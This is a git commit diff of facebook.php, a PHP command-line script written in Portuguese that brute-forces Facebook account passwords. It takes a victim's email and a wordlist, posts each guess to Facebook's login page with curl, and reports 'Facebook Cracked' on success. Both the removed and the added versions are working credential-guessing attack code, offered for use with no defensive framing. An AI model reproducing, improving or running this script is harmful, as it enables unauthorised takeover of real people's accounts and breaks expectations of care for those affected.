a1974003f8f9ed181dc5f0d3f5e0a7b8867189ee
Pablo Santhus <santhuspablo@gmail.com>
2016-08-25 23:18:37 -0300

    Update facebook.php

--- facebook.php
+++ facebook.php
@@ -9,78 +9,89 @@
 		obs: após algumas tentativas o facebook irá bloqueia o acesso
 		a conta por algumas horas.
 	*/
-	error_reporting(0);
-	set_time_limit(0);
-	print menu();
 
-	$email = $argv[1];
-	$dicionario = $argv[2];
+    error_reporting(0);
+    banner();
+    $email = $argv[1];
+    $word = $argv[2];
 
-function menu(){
-print"--------------------------------------------------------------------\n";
-print"\n";
-echo"		 (                         (                                 \n";     
-echo" )\ )          )  (        )\ )                 )    )            	 \n";
-echo"(()/(    )  ( /(  )\      (()/(    )         ( /( ( /(    (       	 \n";
-echo"/(_))( /(  )\())((_) (    /(_))( /(   (     )\()))\())  ))\  (      \n";
-echo"(_))  )(_))((_)\  _   )\  (_))  )(_))  )\ ) (_))/((_)\  /((_) )\    \n";
-echo"| _ \((_)_ | |(_)| | ((_) / __|((_)_  _(_/( | |_ | |(_)(_))( ((_) 	 \n";
-echo"|  _// _` || '_ \| |/ _ \ \__ \/ _` || ' \))|  _|| ' \ | || |(_-< 	 \n";
-echo"|_|  \__,_||_.__/|_|\___/ |___/\__,_||_||_|  \__||_||_| \_,_|/__/	 \n";
-print"\n";
-echo "Facebook Brute \n";
-echo "Criado por Pablo Santhus \n";
-echo "exemplo: php facebook.php seuemail@gmail.com wordlist.txt 	  \n";
-print "\n";
-print"--------------------------------------------------------------------\n\n";
-}
+    function banner(){
+      echo "
+             ____________________________________________________
+            /                                                    \
+           |    _____________________________________________     |
+           |   |                                             |    |
+           |   |  C:\> Criado por Pablo Santhus              |    |
+           |   |       Facebook Brute Force_                 |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |_____________________________________________|    |
+           |                                                      |
+            \_____________________________________________________/
+                   \_______________________________________/
+                _______________________________________________
+             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
+          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
+       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
+    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
+ _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
+:-----------------------------------------------------------------------------:
+`---._.-----------------------------------------------------------------._.---'
+        
+      [+] Criado Por Pablo Santhus
+      [+] Facebook Brute Force
+      [+] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt
 
-	function brute($usuario, $senha){
-		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, "https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php");
-		curl_setopt($ch, CURLOPT_HEADER, 1);
-		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		curl_setopt($ch, CURLOPT_POST, true);
-		curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$usuario&pass=$senha&login=Login");
-		curl_setopt($ch, CURLOPT_USERAGENT, "Opera/9.21 (Windows NT 5.1; U; tr)");
-		curl_setopt($ch, CURLOPT_COOKIE, "datr=80ZzUfKqDOjwL8pauwqMjHTa");
-		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
-		curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
-		$source = curl_exec($ch);
-		$fp = fopen("log.html", "w");
-		fwrite($fp, $source);
-		if(eregi("https://m.facebook.com/home.php", $source)){
-			return true;
-		}else{
-			return false;
-		}
-	}
+      \n\n";
+	sleep(1);
+    }
 
-	if(!is_file($dicionario)){
-		print "\nAdicione um dicionario!\n";
-		print"--------------------------------------------------------------------\n";
-		exit;
-	}
+    function brute($usuario, $senha){
+      $ch = curl_init();
+      curl_setopt($ch, CURLOPT_URL, "https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php");
+      curl_setopt($ch, CURLOPT_HEADER, true);
+      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+      curl_setopt($ch, CURLOPT_POST, true);
+      curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$usuario&pass=$senha");
+      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36");
+      curl_setopt($ch, CURLOPT_COOKIE, "datr=80ZzUfKqDOjwL8pauwqMjHTa");
+      curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
+      curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
+      $source = curl_exec($ch);
+      $fp = fopen("log.html", "w");
+      fwrite($fp, $source);
+      if(eregi("facebook.com/home.php", $source)){
+        return true;
+      }else{
+        return false;
+      }
+    }
 
-if(isset($argv[1]) && isset($argv[2])){
-	$lines = file($dicionario);
-	foreach($lines as $line){
-		$line = str_replace("\r", "", $line);
-		$line = str_replace("\n", "", $line);
-		if(brute($email, $line)){
-			print"--------------------------------------------------------------------\n";
-			print "\n";
-			print "	[+] Email: ".$email. " Senha: ".$line.  "\n";
-			print "\n";
-			print"--------------------------------------------------------------------\n";
-			exit;
-		}else{
-			print "[-] Email: ".$email. " Senha Incorreta: ".$line."\n";
-		}
-	}
-}
-	
-
+    if(isset($argv[1]) && isset($argv[2])){
+      $lines = file($word);
+      foreach($lines as $line){
+        $line = str_replace("\r", "", $line);
+        $line = str_replace("\n", "", $line);
+        if(brute($email, $line)){
+          print "-----------------------------------------------------------------------\n\n";
+          echo "[+] Facebook Cracked -> " . "Email: " . $email . " Senha: " .$line .   "\n\n";
+          print "-------------------------------------------------------------------------\n";
+          exit;
+        }else{
+          echo "[-] Facebook NOT Cracked -> " . "Email: " . $email . " Senha: " .$line . "\n";
+        }
+      }
+    }else{
+    	echo "[-] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt";
+    }
 ?>
